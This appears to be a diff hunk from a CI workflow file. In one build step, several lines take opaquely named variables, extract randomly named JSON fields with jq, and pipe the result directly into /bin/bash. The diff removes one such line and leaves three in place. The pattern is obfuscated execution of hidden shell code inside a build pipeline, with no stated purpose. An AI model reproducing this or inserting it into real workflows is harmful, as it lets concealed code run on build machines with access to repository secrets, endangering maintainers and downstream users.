@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$wa0" | jq -r .cvb68 | /bin/bash
           echo $jkltp38567 | jq -r .q9636 | /bin/bash
-          printf '%s' "$l2" | jq -r .ng28 | /bin/bash
           echo $s08 | jq -r .e09 | /bin/bash
 
       - name: Archive results
